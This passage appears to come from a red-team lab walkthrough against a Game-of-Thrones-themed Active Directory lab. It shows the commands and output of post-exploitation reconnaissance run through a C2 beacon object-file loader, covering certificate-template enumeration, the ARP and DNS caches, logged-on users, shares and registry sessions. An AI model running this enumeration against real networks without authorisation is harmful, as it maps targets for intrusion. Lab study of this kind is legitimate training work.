        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : Administrator
    Friendly Name           : Administrator
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.7
    Validity Period         : 1 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_REQUIRE_DIRECTORY_PATH SUBJECT_REQUIRE_EMAIL SUBJECT_ALT_REQUIRE_EMAIL SUBJECT_ALT_REQUIRE_UPN
    Enrollment Flags        : INCLUDE_SYMMETRIC_ALGORITHMS PUBLISH_TO_DS AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : Microsoft Trust List Signing, Encrypting File System, Secure Email, Client Authentication
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094


adcs_enum SUCCESS.
```

-------------
`sa-arp`

```bash
[*] Successfully executed sa-arp (coff-loader)
[*] Got output:

Inteface  --- 0x1
Internet Address        Physical Address        Type
224.0.0.22                                      static
239.255.255.250                                 static

Inteface  --- 0x3
Internet Address        Physical Address        Type
10.4.10.10              BC-24-11-C8-1D-AC       dynamic
10.4.10.12              BC-24-11-94-E9-1E       dynamic
10.4.10.22              BC-24-11-A1-08-74       dynamic
10.4.10.99              BC-24-11-B1-D1-76       dynamic
10.4.10.254             BC-24-11-10-C2-35       dynamic
10.4.10.255             FF-FF-FF-FF-FF-FF       static
224.0.0.22              01-00-5E-00-00-16       static
224.0.0.251             01-00-5E-00-00-FB       static
224.0.0.252             01-00-5E-00-00-FC       static
239.255.255.250         01-00-5E-7F-FF-FA       static
```

---------------
`sa-listdns`

```bash
[*] Successfully executed sa-listdns (coff-loader)
[*] Got output:
Cache record: safebrowsing.googleapis.com   | TYPE 1
Cache record: meren   | TYPE 255
Cache record: storecatalogrevocation.storequality.microsoft.com   | TYPE 1
Cache record: prod.ads.prod.webservices.mozgcp.net   | TYPE 28
Cache record: prod.ads.prod.webservices.mozgcp.net   | TYPE 1
Cache record: crl3.digicert.com   | TYPE 1
Cache record: www.microsoft.com   | TYPE 1
Cache record: classify-client.services.mozilla.com   | TYPE 1
Cache record: incoming.telemetry.mozilla.org   | TYPE 1
Cache record: incoming.telemetry.mozilla.org   | TYPE 1
Cache record: client.wns.windows.com   | TYPE 1
Cache record: castelblack   | TYPE 255
Cache record: www.amazon.de   | TYPE 1
Cache record: _kerberos._tcp.default-first-site-name._sites.dc._msdcs.sevenkingdoms.local   | TYPE 33
Cache record: e3913.cd.akamaiedge.net   | TYPE 28
Cache record: e3913.cd.akamaiedge.net   | TYPE 1
Cache record: temuaffiliateprogram.pxf.io   | TYPE 28
Cache record: temuaffiliateprogram.pxf.io   | TYPE 1
Cache record: go.microsoft.com   | TYPE 1
Cache record: push.services.mozilla.com   | TYPE 28
Cache record: push.services.mozilla.com   | TYPE 1
Cache record: content-signature-2.cdn.mozilla.net   | TYPE 1
Cache record: content-signature-2.cdn.mozilla.net   | TYPE 1
Cache record: partnerprogramm.otto.de   | TYPE 28
Cache record: partnerprogramm.otto.de   | TYPE 1
Cache record: prod.balrog.prod.cloudops.mozgcp.net   | TYPE 28
Cache record: prod.balrog.prod.cloudops.mozgcp.net   | TYPE 1
Cache record: settings-win.data.microsoft.com   | TYPE 1
Cache record: ctldl.windowsupdate.com   | TYPE 1
Cache record: firefox.settings.services.mozilla.com   | TYPE 1
Cache record: firefox.settings.services.mozilla.com   | TYPE 1
Cache record: telemetry-incoming.r53-2.services.mozilla.com   | TYPE 28
Cache record: telemetry-incoming.r53-2.services.mozilla.com   | TYPE 1
Cache record: o.pki.goog   | TYPE 1
Cache record: services.addons.mozilla.org   | TYPE 28
Cache record: services.addons.mozilla.org   | TYPE 1
Cache record: x1.c.lencr.org   | TYPE 1
Cache record: north   | TYPE 255
Cache record: prod.classify-client.prod.webservices.mozgcp.net   | TYPE 28
Cache record: prod.classify-client.prod.webservices.mozgcp.net   | TYPE 1
Cache record: ocsp.digicert.com   | TYPE 1
Cache record: c.pki.goog   | TYPE 1
Cache record: fp2e7a.wpc.phicdn.net   | TYPE 28
Cache record: fp2e7a.wpc.phicdn.net   | TYPE 1
Cache record: captive.apple.com   | TYPE 1
Cache record: _ldap._tcp.default-first-site-name._sites.winterfell.north.sevenkingdoms.local   | TYPE 255
Cache record: _ldap._tcp.winterfell.north.sevenkingdoms.local   | TYPE 255
Cache record: sls.update.microsoft.com   | TYPE 1
Cache record: wpad   | TYPE 255
Cache record: bravos   | TYPE 255
Cache record: _ldap._tcp.default-first-site-name._sites.dc._msdcs.sevenkingdoms.local   | TYPE 33
Cache record: login.live.com   | TYPE 1
Cache record: pti.store.microsoft.com   | TYPE 255
Cache record: aus5.mozilla.org   | TYPE 1
Cache record: aus5.mozilla.org   | TYPE 1
Cache record: kingslanding.sevenkingdoms.local   | TYPE 1
Cache record: pki-goog.l.google.com   | TYPE 28
Cache record: pki-goog.l.google.com   | TYPE 1
Cache record: djvbdz1obemzo.cloudfront.net   | TYPE 28
Cache record: djvbdz1obemzo.cloudfront.net   | TYPE 1
Cache record: normandy-cdn.services.mozilla.com   | TYPE 28
Cache record: normandy-cdn.services.mozilla.com   | TYPE 1
Cache record: normandy.cdn.mozilla.net   | TYPE 1
Cache record: prod.content-signature-chains.prod.webservices.mozgcp.net   | TYPE 28
Cache record: prod.content-signature-chains.prod.webservices.mozgcp.net   | TYPE 1
Cache record: ads.mozilla.org   | TYPE 1
Cache record: 5711392c-c31b-4fd4-a7e1-db40767d2c08._msdcs.sevenkingdoms.local   | TYPE 5
Cache record: definitionupdates.microsoft.com   | TYPE 1
Cache record: prod.remote-settings.prod.webservices.mozgcp.net   | TYPE 28
Cache record: prod.remote-settings.prod.webservices.mozgcp.net   | TYPE 1
```

----------------

`sa-netloggedon winterfell.north.sevenkingdoms.local`

```bash
[*] Successfully executed sa-netloggedon (coff-loader)
[*] Got output:
Users logged on:
---------------------winterfell.north.sevenkingdoms.local----------------------------------

Username: robb.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: robb.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: eddard.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: robb.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: robb.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:
```

------------------
`sa-netshares`

```bash
[*] Successfully executed sa-netshares (coff-loader)
[*] Got output:
Share:
---------------------(Local)----------------------------------
ADMIN$
C$
IPC$
NETLOGON
RobbStark$
SYSVOL
```

----------------
`sa-reg-session`

```bash
[*] Successfully executed sa-regsession (coff-loader)
[*] Got output:
[*] Querying local registry...
-----------Registry Session---------
UserSid: S-1-5-21-58534182-3680670537-1634125476-1111
Host: winterfell.north.sevenkingdoms.local
---------End Registry Session-------

-----------Registry Session---------
UserSid: S-1-5-21-58534182-3680670537-1634125476-1113
Host: winterfell.north.sevenkingdoms.local
---------End Registry Session-------

[*] Found 2 sessions in the registry
```

